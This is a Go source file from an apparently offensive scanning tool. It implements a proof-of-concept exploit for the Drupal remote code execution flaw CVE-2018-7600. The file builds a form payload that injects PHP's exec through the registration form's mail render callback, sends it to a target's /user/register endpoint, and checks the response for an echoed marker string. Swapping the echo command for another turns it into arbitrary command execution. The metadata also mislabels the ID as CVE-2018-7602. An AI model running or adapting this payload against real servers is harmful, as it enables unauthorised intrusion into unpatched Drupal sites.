package poc

import (
	"io/ioutil"
	"net/http"
	"net/url"
	"strings"
	"time"

	"assassingo/logger"
)

// DrupalRCE - CVE-2018-7600
type DrupalRCE struct {
	target      string
	cmd         string
	payload     url.Values
	Exploitable bool
}

// NewDrupalRCE .
func NewDrupalRCE() *DrupalRCE {
	return &DrupalRCE{
		payload: url.Values{
			"form_id":              {"user_register_form"},
			"_drupal_ajax":         {"1"},
			"mail[#post_render][]": {"exec"},
			"mail[#type]":          {"markup"},
			"mail[#markup]":        {`echo "AssassinGooo"`},
		},
	}
}

// Info implements PoC interface.
func (d *DrupalRCE) Info() Intro {
	return Intro{
		ID:        "CVE-2018-7602",
		Type:      "Remote Code Execution",
		Text:      "biubiubiu",
		Platform:  "PHP",
		Date:      "2018-04-25",
		Reference: "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7602",
	}
}

// Set implements PoC interface.
// Params should be {target string}
func (d *DrupalRCE) Set(v ...interface{}) {
	d.target = v[0].(string)
}

// Report implements PoC interface.
// For batch scan.
func (d *DrupalRCE) Report() map[string]interface{} {
	return map[string]interface{}{
		"host":        d.target,
		"exploitable": d.Exploitable,
	}
}

// Run implements PoC interface.
func (d *DrupalRCE) Run() {
	logger.Green.Println("Checking Drupal RCE (CVE-2018-7600)...")
	d.check()
	logger.Blue.Println(d.target, d.Exploitable)
}

func (d *DrupalRCE) check() {
	client := &http.Client{
		Timeout: 5 * time.Second,
	}
	req, err := http.NewRequest("POST",
		"http://"+d.target+"/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
		strings.NewReader(d.payload.Encode()))
	if err != nil {
		logger.Red.Println(err)
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0")

	resp, err := client.Do(req)
	if err != nil {
		logger.Red.Println(err)
		return
	}
	body, _ := ioutil.ReadAll(resp.Body)
	resp.Body.Close()

	if strings.Contains(string(body), "AssassinGooo") {
		d.Exploitable = true
	}
}
